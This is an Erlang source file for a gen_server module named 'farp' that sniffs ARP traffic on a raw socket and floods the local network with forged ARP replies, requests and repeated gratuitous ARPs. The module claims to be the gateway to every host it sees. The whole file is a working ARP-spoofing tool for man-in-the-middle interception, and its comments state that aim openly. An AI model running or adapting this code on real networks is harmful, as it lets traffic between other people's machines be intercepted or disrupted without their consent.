%% Copyright (c) 2010, Michael Santos <michael.santos@gmail.com>
%% All rights reserved.
%%
%% Redistribution and use in source and binary forms, with or without
%% modification, are permitted provided that the following conditions
%% are met:
%%
%% Redistributions of source code must retain the above copyright
%% notice, this list of conditions and the following disclaimer.
%%
%% Redistributions in binary form must reproduce the above copyright
%% notice, this list of conditions and the following disclaimer in the
%% documentation and/or other materials provided with the distribution.
%%
%% Neither the name of the author nor the names of its contributors
%% may be used to endorse or promote products derived from this software
%% without specific prior written permission.
%%
%% THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
%% "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
%% LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS
%% FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
%% COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
%% INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
%% BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
%% LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
%% CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
%% LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
%% ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
%% POSSIBILITY OF SUCH DAMAGE.
-module(farp).
-behaviour(gen_server).

-define(SERVER, ?MODULE).

-include("epcap_net.hrl").

-export([start/0, start/1, stop/0, recv/4]).
-export([start_link/1]).
-export([init/1, handle_call/3, handle_cast/2, handle_info/2,
        terminate/2, code_change/3]).


-define(ETHER_BROADCAST, <<16#FF, 16#FF, 16#FF, 16#FF, 16#FF, 16#FF>>).

-record(state, {
        s,              % PF_PACKET socket
        i,              % IF Index
        gwip,           % the gateway IP address
        gwmac,          % the gateway MAC address
        ip,             % our IP address
        mac             % our MAC address
    }).



recv(Sha, Sip, Tha, Tip) ->
    gen_server:call(?MODULE, {arp, Sha, Sip, Tha, Tip}).

stop() ->
    gen_server:call(?MODULE, stop).

start() ->
    [Dev] = packet:default_interface(),
    start(Dev).
start(Dev) ->
    start_link(Dev).

start_link(Dev) ->
    gen_server:start_link({local, ?SERVER}, ?MODULE, [Dev], []).

init([Dev]) ->
    {ok, PL} = inet:ifget(Dev, [addr, hwaddr]),

    IP = proplists:get_value(addr, PL),
    MAC = list_to_binary(proplists:get_value(hwaddr, PL)),
    {ok, {M1,M2,M3,M4,M5,M6}, GWIP} = packet:gateway(Dev),

    {ok, Socket} = packet:socket(?ETH_P_ARP),
    Ifindex = packet:ifindex(Socket, Dev),     

    spawn_link(fun() -> sniff(Socket) end),

    % Send a gratuitous arp spoofing the gateway
    spawn_link(fun() -> gateway_arp(Socket, Ifindex, MAC, GWIP) end),

    {ok, #state{
            s = Socket,
            i = Ifindex,
            ip = IP,
            mac = MAC,
            gwmac = <<M1,M2,M3,M4,M5,M6>>,
            gwip = GWIP
        }}.


handle_call({arp, Sha, Sip, Tha, Tip}, _From, #state{ip = IP, mac = MAC} = State)
    when Sip == IP; Tip == IP; Sha == MAC; Tha == MAC; Sip == Tip; Sha == Tha ->
    {reply, ok, State};
handle_call({arp, Sha, Sip, Tha, Tip}, _From, #state{
        mac = MAC,
        s = Socket,
        i = Ifindex,
        gwip = GWIP,
        gwmac = GWMAC
    } = State) ->

    % Don't reply to the broadcast addresses
    case Tha of
        N when N == <<0,0,0,0,0,0>>; N == <<16#FF,16#FF,16#FF,16#FF,16#FF,16#FF>> ->
            ok;
        _ ->
            ok = packet:send(Socket, Ifindex,
                make_arp(?ARPOP_REPLY, MAC, Sip, Tha, Tip)),

            ok = packet:send(Socket, Ifindex,
                make_arp(?ARPOP_REQUEST, MAC, Sip, Tha, Tip)),

            ok = packet:send(Socket, Ifindex, 
                make_arp(?ARPOP_REPLY, MAC, Tip, GWMAC, GWIP)),

            case Tha of
                GWMAC -> ok;
                _ ->
                    ok = packet:send(Socket, Ifindex, 
                        make_arp(?ARPOP_REPLY, MAC, GWIP, Tha, Tip))
            end
    end,

    % Tell the hosts that we are the gateway
    ok = packet:send(Socket, Ifindex, 
        make_arp(?ARPOP_REPLY, MAC, GWIP, Sha, Sip)),

    ok = packet:send(Socket, Ifindex, 
        make_arp(?ARPOP_REPLY, MAC, Tip, Sha, Sip)),

    ok = packet:send(Socket, Ifindex,
        make_arp(?ARPOP_REQUEST, MAC, Tip, Sha, Sip)),

    ok = packet:send(Socket, Ifindex,
        make_arp(?ARPOP_REPLY, MAC, Sip, GWMAC, GWIP)),

    {reply, ok, State};

handle_call(stop, _From, State) ->
    {stop, normal, ok, State}.


handle_cast(_Msg, State) ->
    {noreply, State}.

% WTF?
handle_info(Info, State) ->
    error_logger:error_report([wtf, Info]),
    {noreply, State}.

terminate(_Reason, _State) ->
    ok.
code_change(_OldVsn, State, _Extra) ->
    {ok, State}.


sniff(Socket) ->
    case procket:recvfrom(Socket, 65535) of
        nodata ->
            timer:sleep(10),
            sniff(Socket);
        {ok, Data} ->
            P = epcap_net:decapsulate(Data),
            filter(P),
            sniff(Socket);
        Error ->
            error_logger:error_report(Error)
    end.

filter([#ether{}, #arp{sha = Sha, tha = Tha, sip = Sip, tip = Tip}, _Payload]) when Tip =/= {0,0,0,0} ->
    ?MODULE:recv(Sha, Sip, Tha, Tip);
filter(_) ->
    ok.


make_arp(Type, SrcMac, SrcIP, DstMac, DstIP) ->
    Ether = epcap_net:ether(#ether{
            dhost = DstMac,
            shost = SrcMac,
            type = ?ETH_P_ARP
        }),

    Arp = epcap_net:arp(#arp{
            op = Type,
            sha = SrcMac,
            sip = SrcIP,
            tha = DstMac,
            tip = DstIP
        }),

    list_to_binary([Ether, Arp, <<0:128>>]).

gratuitous_arp(Type, SrcMac, SrcIP) ->
    make_arp(Type, SrcMac, SrcIP, ?ETHER_BROADCAST, SrcIP).

gateway_arp(Socket, Ifindex, SrcMac, SrcIP) ->
    gateway_arp(Socket, Ifindex, SrcMac, SrcIP, 0).
gateway_arp(Socket, Ifindex, SrcMac, SrcIP, N) ->
    error_logger:info_report([{gratuitous, SrcMac, SrcIP}]),
    ok = packet:send(Socket, Ifindex,
        gratuitous_arp(?ARPOP_REPLY, SrcMac, SrcIP)),
    Sleep = case N of
        N when N < 4 -> 1000;
        N -> 2000
    end,
    timer:sleep(Sleep),
    gateway_arp(Socket, Ifindex, SrcMac, SrcIP, N+1).


